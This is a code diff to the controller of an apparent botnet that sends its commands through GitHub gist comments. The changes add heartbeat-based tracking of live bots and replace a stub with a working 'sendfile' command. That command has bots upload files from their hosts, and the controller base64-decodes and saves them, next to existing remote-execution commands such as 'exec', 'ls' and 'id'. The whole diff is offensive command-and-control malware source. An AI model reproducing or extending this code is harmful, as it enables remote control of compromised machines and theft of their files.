@@ -1,13 +1,16 @@
 import argparse
 import time
+import datetime
 import utils
 from utils import Command
 import log
 
 SHOW_INFO = True
 LOGFILE = '.controllog'
+BOT_TTL = 6  # After how many skipped heartbeats is bot considered dead.
 
 LAST_COMMENT = 0
+ALIVE_BOTS = {}
 
 
 # TODO: better message
@@ -33,23 +36,39 @@ def send_heartbeat():
 
 
 def check_bots():
-    global LAST_COMMENT
+    global LAST_COMMENT, ALIVE_BOTS, BOT_TTL
     data, LAST_COMMENT = utils.get_fresh_comments(LAST_COMMENT)
 
-    alive = set()
+    tick_bots()
+
     for comment in data:
         isctrl, bot, cmd, d, r = utils.parse_msg(comment['body'])
         if isctrl: continue
-        alive.add(bot)
+        
+        ALIVE_BOTS[bot] = BOT_TTL
         handle_response(bot, cmd, d)
     
-    log.add_log_entry(SHOW_INFO, LOGFILE, log.AliveBots(alive))
-    return alive
+    log.add_log_entry(SHOW_INFO, LOGFILE, log.AliveBots(ALIVE_BOTS))
+    return len(ALIVE_BOTS)
+
+
+def tick_bots():
+    for bot in ALIVE_BOTS.keys():
+        ttl = ALIVE_BOTS[bot] - 1
+        if ttl <= 0:
+            ALIVE_BOTS.pop(bot)
+        else:
+            ALIVE_BOTS[bot] = ttl
 
 
 def handle_response(bot, cmd, data):
     if cmd != Command.HEARTBEAT:
         log.add_log_entry(SHOW_INFO, LOGFILE, log.Response(bot, cmd, data))
+
+    if cmd == Command.SEND_FILE:
+        s = data.find('\n')
+        filepath, filedata = data[:s], data[s+1:]
+        save_file(bot, filepath, filedata)
 
 
 def send_command(bot, cmd, data, respond):
@@ -57,6 +76,15 @@ def send_command(bot, cmd, data, respond):
     response = utils.post_gist_comment(comment)
     log.add_log_entry(SHOW_INFO, LOGFILE, log.Command(bot, cmd, data, respond))
     return response
+
+
+def save_file(bot, filepath, data):
+    filename = filepath + '.' + str(bot) + '.' + str(datetime.datetime.now())
+    filedata = utils.base64_to_text(data)
+
+    file = open(filename, 'w+')
+    file.write(filedata)
+    file.close()
 
 
 # TODO rework
@@ -67,11 +95,6 @@ def construct_command(bot, cmd, data, respond):
         + cmd.name + utils.DELIM \
         + data + utils.DELIM \
         + str(int(respond)) + utils.DELIM
-
-
-def request_file(bot, filepath, respond):
-    # TODO
-    return
 
 
 def main(args):
@@ -93,9 +116,9 @@ def main(args):
     elif args.command == 'id':
         return send_command(args.bot, Command.CMD, 'id', respond)
 
-    elif args.command == 'req_file' or args.command == 'rf':
+    elif args.command == 'sendfile' or args.command == 'sf':
         if (args.data == ''): return error(args)
-        return request_file(args.bot, args.data, respond)
+        return send_command(args.bot, Command.SEND_FILE, args.data, respond)
 
 
 if __name__ == "__main__":
@@ -106,7 +129,7 @@ if __name__ == "__main__":
             'heartbeat', 'hb',
             'cmd', 'exec',
             'w', 'ls', 'id',
-            'req_file', 'rf',
+            'sendfile', 'sf',
         ])
     parser.add_argument('-d', '--data', default='')
     parser.add_argument('-b', '--bot', default=0, type=int)
